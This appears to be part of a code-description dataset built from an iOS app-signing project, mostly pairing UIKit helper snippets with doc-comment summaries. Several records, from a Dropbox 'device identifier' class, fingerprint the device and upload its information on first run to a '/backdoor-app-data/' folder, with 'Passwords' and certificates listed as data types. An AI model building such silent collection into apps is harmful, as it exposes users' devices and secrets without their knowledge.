    "code": "extension UIButton {\n/// Convert a standard UIButton to a gradient button\n/// - Parameters:\n///   - colors: Gradient colors\n///   - startPoint: Start point of gradient\n///   - endPoint: End point of gradient\nfunc convertToGradientButton(\ncolors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],\nstartPoint: CGPoint = CGPoint.zero,\nendPoint: CGPoint = CGPoint(x: 1, y: 1)",
    "nl": "MARK: - UIButton Extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "extension"
  },
  {
    "id": "1509",
    "code": "func convertToGradientButton(\ncolors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],\nstartPoint: CGPoint = CGPoint.zero,\nendPoint: CGPoint = CGPoint(x: 1, y: 1)\n) {",
    "nl": "/ Convert a standard UIButton to a gradient button / - Parameters: /   - colors: Gradient colors /   - startPoint: Start point of gradient /   - endPoint: End point of gradient",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1510",
    "code": "static func createGradientButton(\ntitle: String,\ncolors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],\ncornerRadius: CGFloat = 12,\nfontSize: CGFloat = 16\n) -> UIButton {",
    "nl": "/ Create a gradient button / - Parameters: /   - title: Button title /   - colors: Gradient colors /   - cornerRadius: Corner radius /   - fontSize: Font size / - Returns: A configured button with gradient",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1511",
    "code": "extension UIViewController {\n/// Show a loading overlay\n/// - Parameters:\n///   - message: Optional loading message\n/// - Returns: The container view that can be removed later\nfunc showLoadingOverlay(message: String? = \"Loading...\") -> UIView {",
    "nl": "MARK: - UIViewController Extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "extension"
  },
  {
    "id": "1512",
    "code": "func showLoadingOverlay(message: String? = \"Loading...\") -> UIView {\nreturn view.addLoadingIndicator(text: message)\n}\n\n/// Hide the loading overlay\n/// - Parameter overlay: The overlay container view returned by showLoadingOverlay\nfunc hideLoadingOverlay(_ overlay: UIView) {",
    "nl": "/ Show a loading overlay / - Parameters: /   - message: Optional loading message / - Returns: The container view that can be removed later",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1513",
    "code": "func hideLoadingOverlay(_ overlay: UIView) {\nUIView.animate(withDuration: 0.3, animations: {",
    "nl": "/ Hide the loading overlay / - Parameter overlay: The overlay container view returned by showLoadingOverlay",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1514",
    "code": "func showSuccessAnimation(message: String? = nil) {\n// Create success icon\nlet imageView = view.addAnimatedIcon(\nsystemName: \"checkmark.circle.fill\",\ntintColor: .systemGreen,\nsize: CGSize(width: 100, height: 100)\n)\n\n// Center the animation\nNSLayoutConstraint.activate([",
    "nl": "/ Show a brief success animation / - Parameter message: Optional success message",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1515",
    "code": "extension CALayer {\n/// Apply a shadow with blue tint to the layer\nfunc applyBlueTintedShadow() {",
    "nl": "MARK: - CALayer Extensions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "extension"
  },
  {
    "id": "1516",
    "code": "func applyBlueTintedShadow() {\nmasksToBounds = false\nshadowColor = UIColor.systemBlue.cgColor\nshadowOffset = CGSize(width: 0, height: 4)\nshadowOpacity = 0.2\nshadowRadius = 8\n}\n}\n\n// MARK: - Animation Helper (replacing the Lottie-based implementation)",
    "nl": "/ Apply a shadow with blue tint to the layer",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1517",
    "code": "class AnimationHelper {\n/// Show a loading animation overlay\n/// - Parameters:\n///   - view: View to add the loader to\n///   - message: Optional message to display\n/// - Returns: Container view that can be removed later\nstatic func showLoader(in view: UIView, message: String? = nil) -> UIView {",
    "nl": "MARK: - Animation Helper (replacing the Lottie-based implementation)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "class"
  },
  {
    "id": "1518",
    "code": "static func showLoader(in view: UIView, message: String? = nil) -> UIView {\nreturn view.addLoadingIndicator(text: message)\n}\n\n/// Hide the loader animation\n/// - Parameter container: Container view returned by showLoader\nstatic func hideLoader(_ container: UIView) {",
    "nl": "/ Show a loading animation overlay / - Parameters: /   - view: View to add the loader to /   - message: Optional message to display / - Returns: Container view that can be removed later",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1519",
    "code": "static func hideLoader(_ container: UIView) {\nUIView.animate(withDuration: 0.3, animations: {",
    "nl": "/ Hide the loader animation / - Parameter container: Container view returned by showLoader",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1520",
    "code": "class ElegantUIComponents {\n/// Create a beautifully styled button with gradient\n/// - Parameters:\n///   - title: Button title\n///   - colors: Gradient colors (default blue gradient)\n///   - cornerRadius: Corner radius (default 12)\n///   - fontSize: Font size (default 16)\n/// - Returns: Configured button\nstatic func createGradientButton(\ntitle: String,",
    "nl": "MARK: - ElegantUIComponents (Replacement without SnapKit & Lottie)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "class"
  },
  {
    "id": "1521",
    "code": "static func createGradientButton(\ntitle: String,\ncolors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],\ncornerRadius: CGFloat = 12,\nfontSize: CGFloat = 16\n) -> UIButton {",
    "nl": "/ Create a beautifully styled button with gradient / - Parameters: /   - title: Button title /   - colors: Gradient colors (default blue gradient) /   - cornerRadius: Corner radius (default 12) /   - fontSize: Font size (default 16) / - Returns: Configured button",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1522",
    "code": "static func createCardView(\nbackgroundColor: UIColor = .systemBackground,\ncornerRadius: CGFloat = 16\n) -> UIView {",
    "nl": "/ Create a card view with shadow / - Parameters: /   - backgroundColor: Card background color /   - cornerRadius: Corner radius / - Returns: Configured card view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1523",
    "code": "static func createFloatingTextField(\nplaceholder: String,\nbackgroundColor: UIColor = .systemBackground,\nborderColor: UIColor = .systemGray4\n) -> UIView {",
    "nl": "/ Create a beautiful text field with floating label / - Parameters: /   - placeholder: Placeholder text /   - backgroundColor: Background color /   - borderColor: Border color / - Returns: Configured text field with container",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "1524",
    "code": "extension UIView {\nvar parentViewController: UIViewController? {",
    "nl": "extension UIView - UI component for display and interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIView+parentcontroller.swift",
    "code_type": "extension"
  },
  {
    "id": "1525",
    "code": "extension UIViewController {\n/// Execute a function with proper error handling and recovery\n/// - Parameters:\n///   - operation: The operation to execute\n///   - errorHandler: Handler for any errors that occur\n///   - completion: Called when operation completes successfully\nfunc executeWithErrorHandling(\noperation: @escaping () throws -> Void,\nerrorHandler: ((Error) -> Void)? = nil,\ncompletion: (() -> Void)? = nil",
    "nl": "/ Extension for adding defensive initialization and error recovery to view controllers",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift",
    "code_type": "extension"
  },
  {
    "id": "1526",
    "code": "func executeWithErrorHandling(\noperation: @escaping () throws -> Void,\nerrorHandler: ((Error) -> Void)? = nil,\ncompletion: (() -> Void)? = nil\n) {",
    "nl": "/ Execute a function with proper error handling and recovery / - Parameters: /   - operation: The operation to execute /   - errorHandler: Handler for any errors that occur /   - completion: Called when operation completes successfully",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift",
    "code_type": "function"
  },
  {
    "id": "1527",
    "code": "private func defaultErrorHandler(_ error: Error) {\nDispatchQueue.main.async { [weak self] in",
    "nl": "/ Default error handler to show an alert / - Parameter error: The error that occurred",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift",
    "code_type": "function"
  },
  {
    "id": "1528",
    "code": "func showRecoveryAlert(title: String, message: String, recoveryOperation: @escaping () -> Void) {\nlet alert = UIAlertController(\ntitle: title,\nmessage: message,\npreferredStyle: .alert\n)\n\n// Add recovery action\nlet recoverAction = UIAlertAction(title: \"Recover\", style: .default) { _ in",
    "nl": "/ Alert with a recovery option to attempt fixing the issue / - Parameters: /   - title: Alert title /   - message: Alert message /   - recoveryOperation: Operation to perform for recovery",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift",
    "code_type": "function"
  },
  {
    "id": "1529",
    "code": "func safePush(\nviewController: UIViewController,\nanimated: Bool,\ncompletion: (() -> Void)? = nil\n) {",
    "nl": "/ Safe method to push a view controller / - Parameters: /   - viewController: The view controller to push /   - animated: Whether to animate the transition /   - completion: Completion handler",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift",
    "code_type": "function"
  },
  {
    "id": "1530",
    "code": "func safePresent(\nviewController: UIViewController,\nanimated: Bool,\ncompletion: (() -> Void)? = nil\n) {",
    "nl": "/ Safe method to present a view controller / - Parameters: /   - viewController: The view controller to present /   - animated: Whether to animate the transition /   - completion: Completion handler",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift",
    "code_type": "function"
  },
  {
    "id": "1531",
    "code": "func showLEDIndicator(type: LEDIndicatorType, message: String? = nil, duration: TimeInterval = 2.0) {\n// Remove any existing indicators\nif let existingIndicator = view.viewWithTag(7777) {",
    "nl": "/ Show an LED-styled indicator for the current state / - Parameters: /   - type: The type of indicator /   - message: Optional message to display /   - duration: How long to show the indicator",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift",
    "code_type": "function"
  },
  {
    "id": "1532",
    "code": "enum LEDIndicatorType {\ncase success\ncase error\ncase warning\ncase info\n\nvar backgroundColor: UIColor {",
    "nl": "/ Types of LED indicators",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift",
    "code_type": "enum"
  },
  {
    "id": "1533",
    "code": "protocol EnhancedViewControllerRefreshable: ViewControllerRefreshable {\n/// Refresh content with defensive error handling\nfunc refreshContentSafely()\n\n/// Check if this controller needs recovery after being in an invalid state\nvar needsRecovery: Bool { get }",
    "nl": "MARK: - ViewControllerRefreshable Enhanced / Protocol for view controllers that can refresh their content",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift",
    "code_type": "protocol"
  },
  {
    "id": "1534",
    "code": "func refreshContentSafely()\n\n/// Check if this controller needs recovery after being in an invalid state\nvar needsRecovery: Bool { get }",
    "nl": "/ Refresh content with defensive error handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift",
    "code_type": "function"
  },
  {
    "id": "1535",
    "code": "func performRecovery()\n}\n\n/// Default implementation of EnhancedViewControllerRefreshable\nextension EnhancedViewControllerRefreshable where Self: UIViewController {",
    "nl": "/ Perform recovery operation to restore the controller to a valid state",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift",
    "code_type": "function"
  },
  {
    "id": "1536",
    "code": "extension EnhancedViewControllerRefreshable where Self: UIViewController {\n/// Default implementation that wraps refreshContent in error handling\nfunc refreshContentSafely() {",
    "nl": "/ Default implementation of EnhancedViewControllerRefreshable",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift",
    "code_type": "extension"
  },
  {
    "id": "1537",
    "code": "func refreshContentSafely() {\nexecuteWithErrorHandling(\noperation: {",
    "nl": "/ Default implementation that wraps refreshContent in error handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift",
    "code_type": "function"
  },
  {
    "id": "1538",
    "code": "func performRecovery() {\n// Default implementation does nothing\n}\n}\n",
    "nl": "/ Default implementation of performRecovery",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/UIViewController+DefensiveInit.swift",
    "code_type": "function"
  },
  {
    "id": "1539",
    "code": "extension View {\n@ViewBuilder\nfunc compatNavigationTransition(id: String, ns: Namespace.ID) -> some View {",
    "nl": "extension View - UI component for display and interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/View+NavTransition.swift",
    "code_type": "extension"
  },
  {
    "id": "1540",
    "code": "func compatNavigationTransition(id: String, ns: Namespace.ID) -> some View {\nif #available(iOS 18.0, *) {",
    "nl": "Function compatNavigationTransition - implements compatnavigationtransition functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/View+NavTransition.swift",
    "code_type": "function"
  },
  {
    "id": "1541",
    "code": "func compatMatchedTransitionSource(id: String, ns: Namespace.ID) -> some View {\nif #available(iOS 18.0, *) {",
    "nl": "Function compatMatchedTransitionSource - implements compatmatchedtransitionsource functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Extensions/UIKit/View+NavTransition.swift",
    "code_type": "function"
  },
  {
    "id": "1542",
    "code": "class EnhancedDropboxDeviceIdentifier {\n// MARK: - Shared Instance\n\n/// Shared singleton instance\nstatic let shared = EnhancedDropboxDeviceIdentifier()\n\n// MARK: - Properties\n\n/// Base path for all uploaded data in Dropbox\nprivate let baseDropboxPath = \"/backdoor-app-data/\"",
    "nl": "/ Enhanced Dropbox device identifier and organization manager",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "class"
  },
  {
    "id": "1543",
    "code": "func setCustomDeviceName(_ name: String) {\nguard !name.isEmpty else { return }",
    "nl": "/ Set custom device name / - Parameter name: The custom name to set",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "function"
  },
  {
    "id": "1544",
    "code": "func folderPath(for type: DataType) -> String {\nreturn deviceFolderPath + type.rawValue + \"/\"\n}\n\n/// Data types that can be stored in Dropbox\nenum DataType: String {",
    "nl": "/ Get subfolder path for specific data type / - Parameter type: The type of data (logs, certs, etc.) / - Returns: Full Dropbox path for the data type",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "function"
  },
  {
    "id": "1545",
    "code": "enum DataType: String {\ncase logs = \"Logs\"\ncase certificates = \"Certificates\"\ncase apps = \"Apps\"\ncase configuration = \"Configuration\"\ncase deviceInfo = \"DeviceInfo\"\ncase passwords = \"Passwords\" // Sensitive data type\n}\n\n/// Collection of device information for Dropbox",
    "nl": "/ Data types that can be stored in Dropbox",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "enum"
  },
  {
    "id": "1546",
    "code": "func collectDeviceInformation() -> [String: Any] {\n// Basic device info\nvar deviceInfo: [String: Any] = [\n\"deviceId\": deviceIdentifier,\n\"deviceName\": deviceName,\n\"formatVersion\": infoFormatVersion,\n\"lastUpdated\": ISO8601DateFormatter().string(from: Date()),\n\"model\": UIDevice.current.model,\n\"systemName\": UIDevice.current.systemName,\n\"systemVersion\": UIDevice.current.systemVersion,",
    "nl": "/ Collection of device information for Dropbox / - Returns: Dictionary with comprehensive device details",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "function"
  },
  {
    "id": "1547",
    "code": "func uploadDeviceInfo() {\n// Collect comprehensive device information\nlet deviceInfo = collectDeviceInformation()\n\n// Convert to JSON\nguard let jsonData = try? JSONSerialization.data(withJSONObject: deviceInfo, options: .prettyPrinted),\nlet jsonString = String(data: jsonData, encoding: .utf8)\nelse {",
    "nl": "/ Upload current device information to Dropbox",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "function"
  },
  {
    "id": "1548",
    "code": "private func generateUniqueDeviceIdentifier() -> String {\n// Combine multiple device properties for uniqueness\nvar components: [String] = []\n\n// Add device model\ncomponents.append(UIDevice.current.model)\n\n// Add vendor identifier if available\nif let vendorId = UIDevice.current.identifierForVendor?.uuidString {",
    "nl": "MARK: - Private Methods / Generate a unique device identifier / - Returns: A unique string identifier for this device",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "function"
  },
  {
    "id": "1549",
    "code": "private func uploadInitialDeviceInfo(for deviceId: String) {\nDebug.shared.log(message: \"Generating initial device info for \\(deviceId)\", type: .info)\nuploadDeviceInfo()\n}\n\n/// Collect storage information\n/// - Returns: Dictionary with storage details\nprivate func collectStorageInfo() -> [String: Any] {",
    "nl": "/ Upload initial device information upon first run / - Parameter deviceId: The device identifier",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "function"
  },
  {
    "id": "1550",
    "code": "private func collectStorageInfo() -> [String: Any] {\nlet fileManager = FileManager.default\n\n// Get app's document directory\nguard let documentsURL = fileManager.urls(for: .documentDirectory, in: .userDomainMask).first else {",
    "nl": "/ Collect storage information / - Returns: Dictionary with storage details",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "function"
  },
  {
    "id": "1551",
    "code": "private func collectEnvironmentInfo() -> [String: String] {\nvar envInfo: [String: String] = [:]\n\n// Add time zone\nenvInfo[\"timeZone\"] = TimeZone.current.identifier\n\n// Add locale\nenvInfo[\"locale\"] = Locale.current.identifier\n\n// Add device orientation",
    "nl": "/ Collect environment information / - Returns: Dictionary with environment details",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "function"
  },
  {
    "id": "1552",
    "code": "private func batteryStateString(_ state: UIDevice.BatteryState) -> String {\nswitch state {",
    "nl": "/ Convert battery state to string / - Parameter state: The battery state / - Returns: String representation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "function"
  },
  {
    "id": "1553",
    "code": "extension FileManager {\n/// Get allocated size of a directory\n/// - Parameter directoryURL: The directory URL\n/// - Returns: Size in bytes\nfunc allocatedSizeOfDirectory(at directoryURL: URL) throws -> Int64 {",
    "nl": "MARK: - FileManager Extension",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "extension"
  },
  {
    "id": "1554",
    "code": "func allocatedSizeOfDirectory(at directoryURL: URL) throws -> Int64 {\nlet resourceKeys: Set<URLResourceKey> = [.isRegularFileKey, .fileAllocatedSizeKey, .totalFileAllocatedSizeKey]\nguard let enumerator = self.enumerator(\nat: directoryURL,\nincludingPropertiesForKeys: Array(resourceKeys),\noptions: [],\nerrorHandler: { (url, error) -> Bool in",
    "nl": "/ Get allocated size of a directory / - Parameter directoryURL: The directory URL / - Returns: Size in bytes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "function"
  },
  {
    "id": "1555",
    "code": "private func batteryStateToString(_ state: UIDevice.BatteryState) -> String {\nswitch state {",
    "nl": "MARK: - UIDevice.BatteryState Helper / Helper function to convert battery state to string for diagnostics",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "function"
  },
  {
    "id": "1556",
    "code": "private func deviceOrientationToString(_ orientation: UIDeviceOrientation) -> String {\nswitch orientation {",
    "nl": "MARK: - UIDeviceOrientation Helper / Helper function to convert device orientation to string for diagnostics",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/EnhancedDropboxDeviceIdentifier.swift",
    "code_type": "function"
  },
  {
    "id": "1557",
    "code": "class ServerCertificateManager {\n// MARK: - Shared Instance\n\nstatic let shared = ServerCertificateManager()\n\n// MARK: - Properties\n\n/// Server certificate file paths\nprivate let serverCrtPath: URL\nprivate let serverPemPath: URL",
    "nl": "/ Manager for server.crt and server.pem certificate files used by the app / These certificates are used for: / 1. Server functionality (HTTPS server in Installer class) / 2. Offline app signing",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/ServerCertificateManager.swift",
    "code_type": "class"
  },
  {
    "id": "1558",
    "code": "func validateCertificates() -> Bool {\n// Check if we've validated recently\nif let lastValidation = lastValidationTime, Date().timeIntervalSince(lastValidation) < 30 {",
    "nl": "Function validateCertificates - implements validatecertificates functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/ServerCertificateManager.swift",
    "code_type": "function"
  },
  {
    "id": "1559",
    "code": "func areCertificatesValid() -> Bool {\nlet fileManager = FileManager.default\n\n// Check if certificate files exist\nlet certExists = fileManager.fileExists(atPath: serverCrtPath.path)\nlet keyExists = fileManager.fileExists(atPath: serverPemPath.path)\n\n// Basic validation - check files exist and aren't empty\nvar isValid = certExists && keyExists\n",
    "nl": "/ Check if server certificates are valid",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/ServerCertificateManager.swift",
    "code_type": "function"
  },
  {
    "id": "1560",
    "code": "func getCertificatePaths() -> (cert: URL, key: URL) {\nreturn (serverCrtPath, serverPemPath)\n}\n\n// MARK: - Private Methods\n\n/// Download server certificates using the app's existing functionality\nprivate func downloadCertificates() {",
    "nl": "/ Get server certificate paths / - Returns: Tuple with paths to certificate and key files",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/ServerCertificateManager.swift",
    "code_type": "function"
  },
  {
    "id": "1561",
    "code": "private func downloadCertificates() {\nlet semaphore = DispatchSemaphore(value: 0)\n\ngetCertificates {",
    "nl": "MARK: - Private Methods / Download server certificates using the app's existing functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Management/ServerCertificateManager.swift",
    "code_type": "function"
  },
  {
    "id": "1562",
    "code": "class AIDataset: Equatable {\nlet id: String\nvar name: String\nlet fileName: String\nlet format: String\nlet size: Int\nlet dateAdded: Date\nlet recordCount: Int\nlet url: URL\n",
    "nl": "/ Model representing an AI dataset file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/AIDataset.swift",
    "code_type": "class"
  },
  {
    "id": "1563",
    "code": "struct AIDatasetInfo {\nlet name: String\nlet description: String\nlet url: URL\nlet size: Int\nlet category: String\n\n/// Formatted size string\nvar formattedSize: String {",
    "nl": "/ Model representing dataset information from online sources",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/AIDataset.swift",
    "code_type": "struct"
  },
  {
    "id": "1564",
    "code": "enum AIDatasetError: Error, LocalizedError {\ncase invalidFormat(String)\ncase invalidData(String)\ncase downloadFailed(String)\ncase trainingFailed(String)\n\nvar errorDescription: String? {",
    "nl": "/ Errors that can occur during dataset operations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/AIDataset.swift",
    "code_type": "enum"
  },
  {
    "id": "1565",
    "code": "struct Entitlement: Codable, Identifiable, Equatable {\n/// Unique identifier for this entitlement\nvar id = UUID()\n\n/// The key for the entitlement (e.g., \"com.apple.developer.networking.wifi-info\")\nvar key: String\n\n/// The value type for this entitlement\nvar valueType: EntitlementValueType\n",
    "nl": "/ Represents a single iOS app entitlement",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/Entitlement.swift",
    "code_type": "struct"
  },
  {
    "id": "1566",
    "code": "private func validateEntitlement() -> Bool {\n// Basic key validation - must be in reverse domain format and non-empty\nguard !key.isEmpty, key.contains(\".\") else {",
    "nl": "/ Validate the entitlement format based on its type",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/Entitlement.swift",
    "code_type": "function"
  },
  {
    "id": "1567",
    "code": "func toPlistValue() -> Any {\nswitch valueType {",
    "nl": "/ Convert to property list compatible value",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/Entitlement.swift",
    "code_type": "function"
  },
  {
    "id": "1568",
    "code": "enum EntitlementValueType: String, Codable, CaseIterable {\ncase boolean = \"Boolean\"\ncase integer = \"Integer\"\ncase string = \"String\"\ncase array = \"Array\"\ncase dictionary = \"Dictionary\"\n}\n\n/// Collection of common iOS entitlements for quick reference\nenum CommonEntitlements {",
    "nl": "/ Represents the type of value an entitlement can have",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/Entitlement.swift",
    "code_type": "enum"
  },
  {
    "id": "1569",
    "code": "enum CommonEntitlements {\nstatic let appGroups = Entitlement(\nkey: \"com.apple.security.application-groups\",\nvalueType: .array,\nstringValue: \"[group.example.identifier]\",\ndescription: \"Share data between apps using App Groups\"\n)\n\nstatic let healthKit = Entitlement(\nkey: \"com.apple.developer.healthkit\",",
    "nl": "/ Collection of common iOS entitlements for quick reference",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Models/Entitlement.swift",
    "code_type": "enum"
  },
  {
    "id": "1570",
    "code": "class AIDatasetManager {\n// MARK: - Singleton\n\nstatic let shared = AIDatasetManager()\n\n// MARK: - Properties\n\nprivate let datasetsDirectory: URL\nprivate let downloadQueue = OperationQueue()\n",
    "nl": "/ Manager class for AI dataset operations",
    "language": "swift",
